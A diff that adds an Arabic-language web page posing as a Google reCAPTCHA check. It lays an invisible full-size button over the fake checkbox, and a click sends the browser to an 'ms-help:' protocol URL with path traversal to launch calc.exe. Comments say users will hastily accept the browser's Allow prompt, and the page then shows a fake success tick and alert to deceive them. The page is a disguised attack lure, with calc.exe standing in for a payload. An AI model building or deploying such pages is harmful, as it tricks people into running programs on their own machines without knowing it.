@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحقق من الأمان</title>
+    <style>
+        body {
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .captcha-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 350px;
+            position: relative;
+            z-index: 1;
+        }
+        .checkbox-pannel {
+            border: 1px solid #d3d3d3;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f9f9f9;
+            cursor: pointer;
+        }
+        .checkbox {
+            width: 30px;
+            height: 30px;
+            border: 2px solid #c1c1c1;
+            border-radius: 3px;
+            background: white;
+        }
+        /* الطبقة المخفية - المحرك الأساسي */
+        #hidden-trigger {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            opacity: 0; /* مخفي تماماً ولكن قابل للنقر */
+            cursor: pointer;
+            z-index: 10;
+        }
+        h2 { color: #555; font-size: 18px; }
+        p { color: #888; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="captcha-container">
+        <h2>التحقق من أنك لست برنامج روبوت</h2>
+        <div class="checkbox-pannel">
+            <div class="checkbox"></div>
+            <span style="font-size: 14px; color: #555;">أنا لست برنامج روبوت</span>
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
+        </div>
+        <p>بضغطك على المربع، أنت توافق على شروط الخدمة</p>
+        
+        <button id="hidden-trigger" onclick="triggerSystem()">Verify</button>
+    </div>
+
+    <script>
+        function triggerSystem() {
+            // محاولة استغلال بروتوكول المساعدة لتنفيذ أمر
+            // في عام 2026، هذا سيظهر نافذة "Allow" في المتصفح 
+            // وبما أن المستخدم ضغط بالفعل، فإنه غالباً سيضغط "Allow" سريعاً
+            window.location.href = "ms-help:////../windows/system32/calc.exe";
+            
+            // تغيير الواجهة بعد الضغط لإيهام المستخدم بالنجاح
+            document.querySelector('.checkbox').innerHTML = "✔️";
+            document.querySelector('.checkbox').style.borderColor = "green";
+            alert("تم التحقق بنجاح!");
+        }
+    </script>
+
+</body>
+</html>
